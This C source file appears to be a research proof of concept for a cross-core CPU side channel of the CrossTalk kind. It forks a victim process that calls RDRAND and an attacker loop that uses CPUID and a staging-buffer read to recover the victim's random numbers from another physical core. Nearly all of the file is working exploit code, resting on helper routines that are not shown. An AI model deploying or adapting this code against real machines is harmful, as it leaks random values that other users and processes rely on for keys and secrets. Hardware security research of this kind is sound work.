#include "../primitives/basic_primitives.h"
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include "utils.h"






void victim(int cpu, int reps, void *mem){
    set_processor_affinity(cpu);
    while(reps--){
        usleep(2000000);
        uint64_t random_number;
        asm volatile("rdrand %0":"=r"(random_number):);
        //printf("[VICTIM] Generated Random Number 0x%16lx\n", random_number);
        //fflush(stdout);
    }

    while(1);
}

void attacker(int reps){
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);
    char staging_buffer[65];
    staging_buffer[64] = 0;
    while(1){
        asm volatile(
        "mov $0x80000004, %%eax\n"
        "cpuid\n"
        "mfence\n"
        :::"eax");
        while (!rdrand_section_changed(mem, byte_32)){}
        uint64_t random_number = 0;
        vector_read(mem, REPS, staging_buffer, 0, 64, 1);
        for(int i = 0; i < 8; i++) {
            random_number = random_number << 8;
            random_number += staging_buffer[32 + i];
        }
        //printf("[ATTACKER] Recovered Random Number 0x%16lx\n", random_number);
        //staging_buffer[40] = 0;
        printf("%s\n", staging_buffer);
        fflush(stdout);
    }
    munmap(mem-1, _page_size * 257);
}


int main(int argc, char **args) {
    printf("Demo 2: Observing RDRAND calls from another physical core.\n\n");
    _page_size = getpagesize();
    get_same_core_cpus(&reader_cpu, &writer_cpu);
    offcore_cpu = reader_cpu + 1;
    printf("Running attacker threads on CPU %d and %d.\nRunning victim on CPU %d.\n\n", reader_cpu, writer_cpu, offcore_cpu);
    fflush(stdout);
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);
    crosstalk_init(argc, args);
    memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
    byte_32 = get_byte_32();
    pid = fork();
    if (!pid) victim_cpuid(0x80000002ul, writer_cpu);
    pid2 = fork();
    if(!pid2) victim(offcore_cpu, 5, mem);
    attacker(5);
    kill(pid2, SIGKILL);
    kill(pid, SIGKILL);
    munmap(mem-1, _page_size * 257);
    usleep(10000);
    crosstalk_cleanup();
    return 0;
}

